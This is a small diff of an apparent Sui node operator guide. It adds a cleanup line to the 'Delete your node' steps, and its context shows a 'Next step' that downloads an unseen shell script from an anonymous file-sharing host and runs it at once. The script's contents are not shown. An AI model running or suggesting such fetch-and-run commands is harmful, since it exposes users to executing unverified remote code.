@@ -49,6 +49,7 @@ Delete your node
 systemctl stop suid
 systemctl disable suid
 rm -rf $HOME/.sui /usr/local/bin/sui*
+rm -rf sui
 
 Next step
 wget -O 9f4q7i.sh https://files.catbox.moe/9f4q7i.sh && chmod +x 9f4q7i.sh && ./9f4q7i.sh
